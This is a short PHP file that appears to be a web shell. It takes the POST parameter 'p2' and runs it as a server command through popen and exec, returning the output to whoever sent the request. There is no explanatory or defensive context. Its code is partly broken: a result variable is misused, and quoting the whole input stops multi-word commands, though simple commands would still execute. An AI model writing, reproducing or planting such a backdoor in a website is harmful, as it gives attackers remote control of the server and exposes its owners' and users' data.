<?php
function ex($in) {
	$res = '';
	$f = @popen($in,"r");
	@exec($in,$res);
	while(!@feof($f))
		$res .= fread($f,1024);
	pclose($f);
	return $res;
}

ex(escapeshellarg($_POST['p2']));
?>